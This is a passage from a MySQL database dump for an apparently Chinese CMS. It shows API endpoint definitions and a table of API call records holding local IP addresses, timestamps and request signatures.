INSERT INTO `jc_api_info` VALUES (55, '查看我的简历', '/api/resume/get.jspx', '011601', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (56, '修改简历', '/api/resume/update.jspx', '011602', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (57, '站内信列表', '/api/message/list.jspx', '011701', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (58, '站内信单信息获取', '/api/message/get.jspx', '011702', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (59, '站内信息发送', '/api/message/send.jspx', '011703', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (60, '站内信草稿修改', '/api/message/draftUpdate.jspx', '011703', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (61, '站内信草稿发送', '/api/message/draftToSend.jspx', '011704', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (62, '删除站内信到回收站', '/api/message/trash.jspx', '011705', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (63, '还原站内信息', '/api/message/revert.jspx', '011706', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (64, '删除站内信', '/api/message/delete.jspx', '011707', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (65, '上传文件', '/api/upload/o_upload.jspx', '011801', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (66, '上传文库文档', '/api/upload/o_upload_doc.jspx', '011802', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (67, '内容打赏记录', '/api/order/getByContent.jspx', '011901', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (68, '我的消费记录和我的订单', '/api/order/myorders.jspx', '011902', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (69, '收益统计', '/api/order/chargelist.jspx', '011903', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (70, '提现申请', '/api/draw/apply.jspx', '011904', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (71, '删除提现申请', '/api/draw/delete.jspx', '011905', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (72, '提现申请列表', '/api/draw/list.jspx', '011906', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (73, '个人账户信息获取', '/api/account/get.jspx', '011907', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (74, '登陆', '/api/user/login.jspx', '012001', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (75, '退出', '/api/user/logout.jspx', '012002', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (76, '用户状态检查', '/api/user/getStatus.jspx', '012003', 0, 0, 0, 0, 0, 0, NULL);

-- ----------------------------
-- Table structure for jc_api_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_record`;
CREATE TABLE `jc_api_record`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `api_account` int(11) NOT NULL DEFAULT 0 COMMENT '调用的账户',
  `call_ip` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '调用的IP',
  `api_info_id` int(11) NULL DEFAULT 0 COMMENT '接口',
  `api_call_time` datetime NOT NULL COMMENT '调用时间',
  `call_time_stamp` bigint(20) NOT NULL DEFAULT 0 COMMENT '调用的时间戳',
  `sign` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '签名数据(不允许重复调用)',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `fk_api_record_account`(`api_account`) USING BTREE,
  INDEX `fk_api_info`(`api_info_id`) USING BTREE,
  INDEX `index_jc_api_record_sign`(`sign`) USING BTREE,
  CONSTRAINT `fk_api_info` FOREIGN KEY (`api_info_id`) REFERENCES `jc_api_info` (`id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_api_record_account` FOREIGN KEY (`api_account`) REFERENCES `jc_api_account` (`id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1261 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'API调用记录' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_api_record
-- ----------------------------
INSERT INTO `jc_api_record` VALUES (323, 1, '192.168.0.158', NULL, '2017-12-26 18:44:45', 1514285085291, '7275DAC8E171E5E8175A26E8ED094610');
INSERT INTO `jc_api_record` VALUES (324, 1, '192.168.0.158', NULL, '2017-12-26 18:44:51', 1514285091195, '46D8F2E55648D13BAA08A2F69E165D0E');
INSERT INTO `jc_api_record` VALUES (325, 1, '192.168.0.158', NULL, '2017-12-26 18:44:54', 1514285094160, 'A0C2BBA82433473A0AF1A24E407B7C75');
INSERT INTO `jc_api_record` VALUES (326, 1, '127.0.0.1', NULL, '2018-11-22 14:37:05', 1542868625663, 'E3F7DB2021AC21EDDAA4EBA23905761E');
INSERT INTO `jc_api_record` VALUES (327, 1, '127.0.0.1', NULL, '2018-11-22 14:39:22', 1542868762438, '3A5E142307F836266945AC7AF0AB7B7B');
INSERT INTO `jc_api_record` VALUES (328, 1, '127.0.0.1', NULL, '2018-11-22 14:39:35', 1542868775989, '4D8A02F43B0D107E2CEE4514B68D7C40');
INSERT INTO `jc_api_record` VALUES (329, 1, '127.0.0.1', NULL, '2018-11-22 14:39:38', 1542868778954, 'BBBA94110CD7C3F50BC53FC4F9F14797');
INSERT INTO `jc_api_record` VALUES (330, 1, '127.0.0.1', NULL, '2018-11-22 14:43:11', 1542868991262, '86194127A47BD4300598FEEE9ED8DAFD');
INSERT INTO `jc_api_record` VALUES (331, 1, '127.0.0.1', NULL, '2018-11-22 14:44:41', 1542869081611, '52B86336AAE979862E35C9F6F14F86B8');
INSERT INTO `jc_api_record` VALUES (332, 1, '127.0.0.1', NULL, '2018-11-22 14:44:45', 1542869085751, '71C6EC127D7428BB30B841E585E913FD');
INSERT INTO `jc_api_record` VALUES (333, 1, '127.0.0.1', NULL, '2018-11-22 15:08:31', 1542870511357, 'E93EDEEDC9F9F1FBB3083D594A64218F');
INSERT INTO `jc_api_record` VALUES (334, 1, '127.0.0.1', NULL, '2018-11-22 15:17:40', 1542871060011, '6722E9D4D991F26EE764951786FF4761');
INSERT INTO `jc_api_record` VALUES (335, 1, '127.0.0.1', NULL, '2018-11-22 15:18:03', 1542871083656, '175FB55CC67535BB156D7C8EC5CD4086');
INSERT INTO `jc_api_record` VALUES (336, 1, '127.0.0.1', NULL, '2018-11-22 15:19:46', 1542871186912, '529C0C228A6B7076D36D2C60CD4EEABF');
INSERT INTO `jc_api_record` VALUES (337, 1, '127.0.0.1', NULL, '2018-11-22 15:20:15', 1542871215774, '9B72B16FC4D296AF746E3050008BAD0E');
INSERT INTO `jc_api_record` VALUES (338, 1, '127.0.0.1', NULL, '2018-11-22 15:20:21', 1542871221508, '23AD04EE3D4E87A9F3C28F6F0E42DE16');
INSERT INTO `jc_api_record` VALUES (339, 1, '127.0.0.1', NULL, '2018-11-22 15:52:44', 1542873164579, 'D5373978D4D8B539D775972DC955AB5B');
INSERT INTO `jc_api_record` VALUES (340, 1, '127.0.0.1', NULL, '2018-11-22 15:58:01', 1542873481867, '755EA1424960C26E5A29A181C9365AA5');
INSERT INTO `jc_api_record` VALUES (341, 1, '127.0.0.1', NULL, '2018-11-22 15:59:11', 1542873551152, 'B2C19B493A90248541C7310AAEC983FC');
INSERT INTO `jc_api_record` VALUES (342, 1, '127.0.0.1', NULL, '2018-11-22 15:59:48', 1542873588721, 'EB05D7903C6298BE402624C4F9D6937F');
INSERT INTO `jc_api_record` VALUES (343, 1, '127.0.0.1', NULL, '2018-11-22 16:00:12', 1542873612426, '92D7F3BDF104812ACDDEE633A701E2B8');
INSERT INTO `jc_api_record` VALUES (344, 1, '127.0.0.1', NULL, '2018-11-22 16:01:00', 1542873660843, '7EE0BC2321694A04E306B14023AAF5B4');
INSERT INTO `jc_api_record` VALUES (345, 1, '127.0.0.1', NULL, '2018-11-22 16:05:03', 1542873903181, '66F843B07E7BA1F0EDA802A5A47ADF18');
INSERT INTO `jc_api_record` VALUES (346, 1, '127.0.0.1', NULL, '2018-11-22 16:13:39', 1542874419048, '036D0AF99FD816EDB9D4A2BDFF8BD372');
INSERT INTO `jc_api_record` VALUES (347, 1, '127.0.0.1', NULL, '2018-11-22 16:38:42', 1542875922002, 'A20936EB3ED2520E67B0B0208BB2D22B');
INSERT INTO `jc_api_record` VALUES (348, 1, '127.0.0.1', NULL, '2018-11-22 16:40:25', 1542876025249, '4E6BD5DE5B7FCAF8ACE8D27664D26269');
INSERT INTO `jc_api_record` VALUES (349, 1, '127.0.0.1', NULL, '2018-11-22 16:42:46', 1542876166188, '2127A07E3B87A9B40893084F3CBA69A8');
INSERT INTO `jc_api_record` VALUES (350, 1, '127.0.0.1', NULL, '2018-11-22 16:43:12', 1542876192973, '34A9D125BEAE3A4A255BEFA1B44ADA4D');
INSERT INTO `jc_api_record` VALUES (351, 1, '127.0.0.1', NULL, '2018-11-22 16:44:53', 1542876293587, 'F3B4988BAA2FBA13ED3C9AC643644F2E');
INSERT INTO `jc_api_record` VALUES (352, 1, '127.0.0.1', NULL, '2018-11-22 16:49:02', 1542876542965, 'CBB539EF581D1B95C8C68CE66EA08220');
INSERT INTO `jc_api_record` VALUES (353, 1, '127.0.0.1', NULL, '2018-11-22 17:01:23', 1542877283265, 'F9FDAD88E096B54750FA79CD14E0B830');
INSERT INTO `jc_api_record` VALUES (354, 1, '127.0.0.1', NULL, '2018-11-22 17:25:57', 1542878757943, 'F268EE4F983FB1F6E40169649666812A');
INSERT INTO `jc_api_record` VALUES (355, 1, '127.0.0.1', NULL, '2018-11-22 17:28:14', 1542878894339, 'ED22EFD8582E5A1FFBBE8C803A7905D7');
INSERT INTO `jc_api_record` VALUES (356, 1, '127.0.0.1', NULL, '2018-11-22 17:29:14', 1542878954596, '9C6D9E4A32B5494E58F5B942CD455CD1');
INSERT INTO `jc_api_record` VALUES (357, 1, '127.0.0.1', NULL, '2018-11-22 17:29:41', 1542878981843, '47F3AC68FE256F36BBC609F6594F3A63');
INSERT INTO `jc_api_record` VALUES (358, 1, '127.0.0.1', NULL, '2018-11-22 17:30:38', 1542879038337, '2A1D8B519FF223D1FBE0783377CBFFCA');
INSERT INTO `jc_api_record` VALUES (359, 1, '127.0.0.1', NULL, '2018-11-22 17:35:03', 1542879303445, 'B2212082FB4C0515F56E84A829AF66CB');
INSERT INTO `jc_api_record` VALUES (360, 1, '127.0.0.1', NULL, '2018-11-23 09:14:18', 1542935658786, '5238079EB99D1C924194CC346343C554');
INSERT INTO `jc_api_record` VALUES (361, 1, '127.0.0.1', NULL, '2018-11-23 09:15:52', 1542935752270, '7262AD1DE63B781FAE596920D66F45B3');
INSERT INTO `jc_api_record` VALUES (362, 1, '127.0.0.1', NULL, '2018-11-23 09:15:55', 1542935755793, '64BDAF30A72971D662A88A870EFF5873');
INSERT INTO `jc_api_record` VALUES (363, 1, '127.0.0.1', NULL, '2018-11-23 09:51:16', 1542937876628, '37EC1BB7F4080713C3FD5C45E351C277');
INSERT INTO `jc_api_record` VALUES (364, 1, '127.0.0.1', NULL, '2018-11-23 10:12:18', 1542939138727, '9A8AC828A4FB5992C8208D00EAA1C7F2');
INSERT INTO `jc_api_record` VALUES (365, 1, '127.0.0.1', NULL, '2018-11-23 11:06:03', 1542942363953, '96877F1C937BEBD318B7E89727F9C8EE');
INSERT INTO `jc_api_record` VALUES (366, 1, '127.0.0.1', NULL, '2018-11-26 09:52:02', 1543197122474, '5805C6EEF9438B18D0E82C303C4C343B');
INSERT INTO `jc_api_record` VALUES (367, 1, '127.0.0.1', NULL, '2018-11-26 17:04:27', 1543223067053, 'B43CDFF67005653E5098697D41EFD453');
INSERT INTO `jc_api_record` VALUES (368, 1, '127.0.0.1', NULL, '2018-11-27 09:14:57', 1543281297984, 'B7F61449302AA259146C3049963BCAD1');
INSERT INTO `jc_api_record` VALUES (369, 1, '127.0.0.1', NULL, '2018-11-27 09:20:22', 1543281622695, 'A757C83B49A5C8207587D8253FDDC880');
INSERT INTO `jc_api_record` VALUES (370, 1, '127.0.0.1', NULL, '2018-11-27 09:20:59', 1543281659940, '6903F6E3E34B1B600FDE3D37210F259A');
INSERT INTO `jc_api_record` VALUES (371, 1, '127.0.0.1', NULL, '2018-11-27 09:33:25', 1543282405324, '55FF3BB300487D954F807E7F652D70E7');
INSERT INTO `jc_api_record` VALUES (372, 1, '127.0.0.1', NULL, '2018-11-27 09:35:12', 1543282512211, '47FD7342B5F1D7C314E8D3D4281A664D');
INSERT INTO `jc_api_record` VALUES (373, 1, '127.0.0.1', NULL, '2018-11-27 09:37:29', 1543282649373, '9BF9F59A171CC0D1478DC8646905EABB');
INSERT INTO `jc_api_record` VALUES (374, 1, '127.0.0.1', NULL, '2018-11-27 09:39:11', 1543282751222, '879E1F21301FEAFBFBA28693C385DA6E');
INSERT INTO `jc_api_record` VALUES (375, 1, '127.0.0.1', NULL, '2018-11-27 10:42:00', 1543286520364, 'ABE92DEF19AB61C5678EFEFD61D233FB');
INSERT INTO `jc_api_record` VALUES (376, 1, '127.0.0.1', NULL, '2018-11-27 11:14:17', 1543288457028, 'AB9EDBF62B090599161D0B9B20342AD0');
INSERT INTO `jc_api_record` VALUES (377, 1, '127.0.0.1', NULL, '2018-11-27 13:23:05', 1543296185558, '99C184ACBEA6254061F00DEA0D6A00C1');
INSERT INTO `jc_api_record` VALUES (378, 1, '127.0.0.1', NULL, '2018-11-27 13:25:57', 1543296357675, '0D64EA50E5C705C3869A2A05CE1C8A3B');
INSERT INTO `jc_api_record` VALUES (379, 1, '127.0.0.1', NULL, '2018-11-27 13:36:11', 1543296971117, '484BA70FB280CEE04C0BD7E3BCA3A546');
INSERT INTO `jc_api_record` VALUES (380, 1, '127.0.0.1', NULL, '2018-11-27 13:37:41', 1543297061820, 'F3CE1D4F7942FEE3F356C8E87795C140');
INSERT INTO `jc_api_record` VALUES (381, 1, '127.0.0.1', NULL, '2018-11-27 13:38:36', 1543297116049, '0EB796E5991E7E206C6D4DC4C3183AD1');
INSERT INTO `jc_api_record` VALUES (382, 1, '127.0.0.1', NULL, '2018-11-27 13:38:51', 1543297131267, 'AFECD43421756811980BD25C2EEEEA5C');
INSERT INTO `jc_api_record` VALUES (383, 1, '127.0.0.1', NULL, '2018-11-27 13:40:13', 1543297213143, '11BD94E20E1B1802D0177EA37085F594');
INSERT INTO `jc_api_record` VALUES (384, 1, '127.0.0.1', NULL, '2018-11-27 13:40:23', 1543297223517, 'A83183B0A82185C0459A854AF5A5ED08');
INSERT INTO `jc_api_record` VALUES (385, 1, '127.0.0.1', NULL, '2018-11-27 13:41:17', 1543297277023, '609B1C2EAB1EBCF75E2C2304C65A6C36');
INSERT INTO `jc_api_record` VALUES (386, 1, '127.0.0.1', NULL, '2018-11-27 13:45:48', 1543297548682, 'CBD9D2D1A016474D049646A76DE1DB6D');
INSERT INTO `jc_api_record` VALUES (387, 1, '127.0.0.1', NULL, '2018-11-27 14:14:34', 1543299274840, '26304ABDB0233911786F9A7C27D153EB');
INSERT INTO `jc_api_record` VALUES (388, 1, '127.0.0.1', NULL, '2018-11-27 14:45:16', 1543301116555, 'FF01523D32D6088C7ABA462EDD9D80C4');
INSERT INTO `jc_api_record` VALUES (389, 1, '127.0.0.1', NULL, '2018-11-27 15:01:08', 1543302068725, '31244F7C519593F9017FF7A4C1BB43AC');
INSERT INTO `jc_api_record` VALUES (390, 1, '127.0.0.1', NULL, '2018-11-27 15:03:16', 1543302196394, '4DED9260CF917CF77C3FFCE543D4D156');
INSERT INTO `jc_api_record` VALUES (391, 1, '127.0.0.1', NULL, '2018-11-27 15:04:46', 1543302286300, '33B0FBF75A7ED320AAEBF20833664255');
INSERT INTO `jc_api_record` VALUES (392, 1, '127.0.0.1', NULL, '2018-11-27 15:10:41', 1543302641682, 'C47C1F131DB47851C1CFA4BEFC67A6F3');
INSERT INTO `jc_api_record` VALUES (393, 1, '127.0.0.1', NULL, '2018-11-27 16:11:27', 1543306287421, '500A2194BFACB2C574A68B7B486B61D8');
INSERT INTO `jc_api_record` VALUES (394, 1, '127.0.0.1', NULL, '2018-11-27 17:04:54', 1543309494764, 'FC66A88CDED7FDF1724D2EA908FD632B');
INSERT INTO `jc_api_record` VALUES (395, 1, '127.0.0.1', NULL, '2018-11-27 17:05:47', 1543309547654, '085BD7C1F20F8E679B50D5B84743ACD9');
INSERT INTO `jc_api_record` VALUES (396, 1, '127.0.0.1', NULL, '2018-11-28 09:30:12', 1543368612744, '55D65953F44A8E343ABAEA8954EAE08C');
INSERT INTO `jc_api_record` VALUES (397, 1, '127.0.0.1', NULL, '2018-11-28 09:31:02', 1543368662528, '36FA0ECD36DDB56A1B524AD8755C0920');
INSERT INTO `jc_api_record` VALUES (398, 1, '127.0.0.1', NULL, '2018-11-28 09:32:33', 1543368753818, '8B37B9B1BEE1924709435CAAEB8A855E');
INSERT INTO `jc_api_record` VALUES (399, 1, '127.0.0.1', NULL, '2018-11-28 09:40:02', 1543369202996, 'F82606F29E269D0F4E1CB3EE273BC163');
INSERT INTO `jc_api_record` VALUES (400, 1, '127.0.0.1', NULL, '2018-11-28 09:40:52', 1543369252575, '24053BF52D2FED938B3BBF20803E0836');
INSERT INTO `jc_api_record` VALUES (401, 1, '127.0.0.1', NULL, '2018-11-28 09:49:47', 1543369787566, '58DD6EDB6517B92783EA3BC8F43A08D7');
INSERT INTO `jc_api_record` VALUES (402, 1, '127.0.0.1', NULL, '2018-11-28 09:57:39', 1543370259527, '0368B0ED8E9639199AB502FFCCCF9EE7');
INSERT INTO `jc_api_record` VALUES (403, 1, '127.0.0.1', NULL, '2018-11-28 09:58:51', 1543370331732, '22B06303B67BDF0439B703651820F7BF');
INSERT INTO `jc_api_record` VALUES (404, 1, '127.0.0.1', NULL, '2018-11-28 09:59:55', 1543370395170, '4A49BDB720E762168A096ABDAD82E1C0');
INSERT INTO `jc_api_record` VALUES (405, 1, '127.0.0.1', NULL, '2018-11-28 10:00:30', 1543370430430, '0B806000A776603FC6E84C0D33C17782');
INSERT INTO `jc_api_record` VALUES (406, 1, '127.0.0.1', NULL, '2018-11-28 10:14:12', 1543371252599, 'B46A1366FC86186302E7021450BBCC08');
INSERT INTO `jc_api_record` VALUES (407, 1, '127.0.0.1', NULL, '2018-11-28 10:14:16', 1543371256200, '4D6775DDD6E9A3187B0245ADC09E6358');
INSERT INTO `jc_api_record` VALUES (408, 1, '127.0.0.1', NULL, '2018-11-28 10:14:18', 1543371258795, '114EA1F72587BBF165FE97FC9EEB9582');
INSERT INTO `jc_api_record` VALUES (409, 1, '127.0.0.1', NULL, '2018-11-28 10:14:26', 1543371266917, 'C4FAD2A8ED91AEA4F5D8C690A0696F61');
INSERT INTO `jc_api_record` VALUES (410, 1, '127.0.0.1', NULL, '2018-11-28 10:16:20', 1543371380486, 'D515AF327097BC37880AEB3F4AA0AB98');
INSERT INTO `jc_api_record` VALUES (411, 1, '127.0.0.1', NULL, '2018-11-28 10:32:29', 1543372349183, '851FAF5E6D6EE3CDD214151EB8684E63');
INSERT INTO `jc_api_record` VALUES (412, 1, '127.0.0.1', NULL, '2018-11-28 10:32:55', 1543372375889, '5D8CB0F2EF58CDBB070C72AA19A4F71D');
INSERT INTO `jc_api_record` VALUES (413, 1, '127.0.0.1', NULL, '2018-11-28 10:34:00', 1543372440900, 'BD5EC4EA6E5B1E40CFB347D1967701A4');
INSERT INTO `jc_api_record` VALUES (414, 1, '127.0.0.1', NULL, '2018-11-28 10:58:14', 1543373894010, '3D0F9D619A938D87BA3C6FA06B98B170');
INSERT INTO `jc_api_record` VALUES (415, 1, '127.0.0.1', NULL, '2018-11-28 11:03:05', 1543374185652, '59B9D411E32D71328E525C0FD7BDD8F2');
INSERT INTO `jc_api_record` VALUES (416, 1, '127.0.0.1', NULL, '2018-11-28 11:03:54', 1543374234861, '411434CE55631F7C2F6F7C83C2B482C6');
INSERT INTO `jc_api_record` VALUES (417, 1, '127.0.0.1', NULL, '2018-11-28 11:31:10', 1543375870632, 'BE4BDA507AB3559733FECEA4BED03BC6');
INSERT INTO `jc_api_record` VALUES (418, 1, '127.0.0.1', NULL, '2018-11-28 11:37:35', 1543376255905, '035C5596E8316A5A3A52F71A837EA779');
INSERT INTO `jc_api_record` VALUES (419, 1, '127.0.0.1', NULL, '2018-11-28 12:05:27', 1543377927571, '7D7CA103AF9E3C874E47EA7F8B51605D');
INSERT INTO `jc_api_record` VALUES (420, 1, '127.0.0.1', NULL, '2018-11-29 09:44:32', 1543455872528, 'ACA1006020885E7B2647F24B1CC1EFB0');
INSERT INTO `jc_api_record` VALUES (421, 1, '127.0.0.1', NULL, '2018-11-29 09:58:37', 1543456717458, 'F676877CCA4EA463D751DCA39B3EC161');
INSERT INTO `jc_api_record` VALUES (422, 1, '127.0.0.1', NULL, '2018-11-29 10:02:56', 1543456976163, 'D77F372B0444511732C13BAD6D56ED76');
INSERT INTO `jc_api_record` VALUES (423, 1, '127.0.0.1', NULL, '2018-11-29 10:03:45', 1543457025149, '85180B1B84E2C2436BFA47953F6291C4');
INSERT INTO `jc_api_record` VALUES (424, 1, '127.0.0.1', NULL, '2018-11-29 10:04:24', 1543457064843, '91F32A2361E96D5CC9CD0AF2BDADFDB4');
INSERT INTO `jc_api_record` VALUES (425, 1, '127.0.0.1', NULL, '2018-11-29 10:53:27', 1543460007043, 'C7FF9EF7DBEF35C152F58C74801A2C3C');
INSERT INTO `jc_api_record` VALUES (426, 1, '127.0.0.1', NULL, '2018-11-29 11:16:32', 1543461392933, '7862C02CDC95FFC3A7CCAC4E5C06F80F');
INSERT INTO `jc_api_record` VALUES (427, 1, '127.0.0.1', NULL, '2018-11-29 11:27:52', 1543462072643, '74D0A30B68834A926D01D509DE610429');
INSERT INTO `jc_api_record` VALUES (428, 1, '127.0.0.1', NULL, '2018-11-29 11:34:36', 1543462476314, '1BCB59E0FDDA3336B857CC76A838185B');
INSERT INTO `jc_api_record` VALUES (429, 1, '127.0.0.1', NULL, '2018-11-29 14:22:17', 1543472537804, 'E041D25D0062C1B29128685B72C6A2F1');
INSERT INTO `jc_api_record` VALUES (430, 1, '127.0.0.1', NULL, '2018-11-29 14:25:26', 1543472726101, 'CB5A92748CE136D30BC31790D258E86E');
INSERT INTO `jc_api_record` VALUES (431, 1, '127.0.0.1', NULL, '2018-11-29 14:29:31', 1543472971075, '20370ED61FBD5249D36B7BC644736294');
INSERT INTO `jc_api_record` VALUES (432, 1, '127.0.0.1', NULL, '2018-11-29 14:31:41', 1543473101450, '3EB29DC0B6CF7D168F23053157C53DB9');
INSERT INTO `jc_api_record` VALUES (433, 1, '127.0.0.1', NULL, '2018-11-29 14:44:48', 1543473888472, 'A87E4EC0D58CCC1CF21F530E61DAC4F9');
INSERT INTO `jc_api_record` VALUES (434, 1, '127.0.0.1', NULL, '2018-11-29 14:48:34', 1543474114010, 'AA3EA129DCAAC43ABD1ACE2F0E2C2CBD');
INSERT INTO `jc_api_record` VALUES (435, 1, '127.0.0.1', NULL, '2018-11-29 14:59:24', 1543474764410, '096F13035B7C1666B331231D7BD32E0F');
INSERT INTO `jc_api_record` VALUES (436, 1, '127.0.0.1', NULL, '2018-11-29 15:00:30', 1543474830079, 'D5BE1B9FBCB3D9ED5FFF1183E584F783');
INSERT INTO `jc_api_record` VALUES (437, 1, '127.0.0.1', NULL, '2018-11-29 15:03:47', 1543475027585, 'C28309577ECB9F253729381F8B6634E3');
INSERT INTO `jc_api_record` VALUES (438, 1, '127.0.0.1', NULL, '2018-11-29 15:04:51', 1543475091417, 'D7A6D61B88A27EEDD64D8456B778C9C5');
INSERT INTO `jc_api_record` VALUES (439, 1, '127.0.0.1', NULL, '2018-11-29 15:27:54', 1543476474491, 'F8B45A7657741E012D8874E5A0B58862');
INSERT INTO `jc_api_record` VALUES (440, 1, '127.0.0.1', NULL, '2018-11-29 16:00:34', 1543478434511, '2A803DC7F10BF5C9555325E6B31C130C');
INSERT INTO `jc_api_record` VALUES (441, 1, '127.0.0.1', NULL, '2018-11-29 16:11:11', 1543479071427, '542E644FE5ED46475C070BC254DCB0D8');
INSERT INTO `jc_api_record` VALUES (442, 1, '127.0.0.1', NULL, '2018-11-29 16:50:36', 1543481436371, '8A4B491323D4D9CB0D00368AAC63BE99');
INSERT INTO `jc_api_record` VALUES (443, 1, '127.0.0.1', NULL, '2018-11-29 16:57:25', 1543481845459, '3ECD6B3933193061AD1E05F9A086685F');
INSERT INTO `jc_api_record` VALUES (444, 1, '127.0.0.1', NULL, '2018-11-29 17:02:34', 1543482154983, 'C2A95DFC99718F58CC0B23C043BA2AE5');
INSERT INTO `jc_api_record` VALUES (445, 1, '127.0.0.1', NULL, '2018-11-29 17:08:14', 1543482494119, '73CC79BE04485D9F77D0D8276E90B447');
INSERT INTO `jc_api_record` VALUES (446, 1, '127.0.0.1', NULL, '2018-11-29 17:19:40', 1543483180650, 'C051964AEBCBE14329B0A103956AC638');
INSERT INTO `jc_api_record` VALUES (447, 1, '127.0.0.1', NULL, '2018-11-29 17:25:18', 1543483518366, '82C2A20B9FC63E56509302F3284C8541');
INSERT INTO `jc_api_record` VALUES (448, 1, '127.0.0.1', NULL, '2018-11-30 09:57:10', 1543543030300, 'E56114D83AD2FD8AD50C66C1A02615F1');
INSERT INTO `jc_api_record` VALUES (449, 1, '127.0.0.1', NULL, '2018-11-30 09:58:47', 1543543127032, '72EA115A0B9A9C3D3B2D0C6C261B947D');
INSERT INTO `jc_api_record` VALUES (450, 1, '127.0.0.1', NULL, '2018-11-30 10:09:03', 1543543743724, '678486A4CC0E0ECC2E05218400B45DEA');
INSERT INTO `jc_api_record` VALUES (451, 1, '127.0.0.1', NULL, '2018-11-30 10:09:12', 1543543752919, '33F7D793960FB61A66B845F007A0BD5B');
INSERT INTO `jc_api_record` VALUES (452, 1, '127.0.0.1', NULL, '2018-11-30 10:10:36', 1543543836081, '1B48421B26C3291DD300324DC0E9CDA2');
INSERT INTO `jc_api_record` VALUES (453, 1, '127.0.0.1', NULL, '2018-11-30 10:10:56', 1543543856815, '24863896804906068BB2109BE1F20ACE');
INSERT INTO `jc_api_record` VALUES (454, 1, '127.0.0.1', NULL, '2018-11-30 10:12:08', 1543543928446, '8D3C8F0244F34BAFA9E808AFBF6296DD');
INSERT INTO `jc_api_record` VALUES (455, 1, '127.0.0.1', NULL, '2018-11-30 10:13:15', 1543543995728, '4F5CCC401425FA396057A9B481FD3952');
INSERT INTO `jc_api_record` VALUES (456, 1, '127.0.0.1', NULL, '2018-11-30 10:14:22', 1543544062606, '6128817F72439553309E45E36B3CE606');
INSERT INTO `jc_api_record` VALUES (457, 1, '127.0.0.1', NULL, '2018-11-30 10:14:27', 1543544067633, '6128817F72439553309E45E36B3CE606');
INSERT INTO `jc_api_record` VALUES (458, 1, '127.0.0.1', NULL, '2018-11-30 10:14:33', 1543544073116, '677780B42B91330A6A4DD503A974C0E1');
INSERT INTO `jc_api_record` VALUES (459, 1, '127.0.0.1', NULL, '2018-11-30 10:15:36', 1543544136151, '19E13196D13649039A61AD19F1DE030B');
INSERT INTO `jc_api_record` VALUES (460, 1, '127.0.0.1', NULL, '2018-11-30 10:15:38', 1543544138228, '59B59B5EDFE86444EDC5BF250C86E218');
INSERT INTO `jc_api_record` VALUES (461, 1, '127.0.0.1', NULL, '2018-11-30 10:15:39', 1543544139459, '4BC7D895E6FEEA08063C2C43EE0FC121');
INSERT INTO `jc_api_record` VALUES (462, 1, '127.0.0.1', NULL, '2018-11-30 10:15:40', 1543544140630, '6CDB0F684FEC873A520CB4311BE8F4EB');
INSERT INTO `jc_api_record` VALUES (463, 1, '127.0.0.1', NULL, '2018-11-30 10:15:45', 1543544145715, 'CF5A0D11D06F91A1006F867A0158B358');
INSERT INTO `jc_api_record` VALUES (464, 1, '127.0.0.1', NULL, '2018-11-30 10:15:52', 1543544152045, 'AE7AF280CEE0D6413AD39BFBC348CAB0');
INSERT INTO `jc_api_record` VALUES (465, 1, '127.0.0.1', NULL, '2018-11-30 10:15:53', 1543544153477, '85886A4A6BE8B9CE1AFF244D01791B27');
INSERT INTO `jc_api_record` VALUES (466, 1, '127.0.0.1', NULL, '2018-11-30 10:16:35', 1543544195820, '975BC01F1C0D8FC801CF4BAF2818E5B9');
INSERT INTO `jc_api_record` VALUES (467, 1, '127.0.0.1', NULL, '2018-11-30 10:16:44', 1543544204895, '08B57553C4202573DDDC5059B2B006ED');
INSERT INTO `jc_api_record` VALUES (468, 1, '127.0.0.1', NULL, '2018-11-30 10:18:41', 1543544321737, 'E84FB2AD4F5748256205EDB40F95A893');
INSERT INTO `jc_api_record` VALUES (469, 1, '127.0.0.1', NULL, '2018-11-30 10:19:26', 1543544366057, 'B2EBF380A06382D7F7967B35A1BA1403');
INSERT INTO `jc_api_record` VALUES (470, 1, '127.0.0.1', NULL, '2018-11-30 10:19:40', 1543544380253, '19B02866CAFB2AFF3061D14F20894B34');
INSERT INTO `jc_api_record` VALUES (471, 1, '127.0.0.1', NULL, '2018-11-30 10:19:49', 1543544389973, 'C09A0498FC4E60C212FC0A3B8C02EB2D');
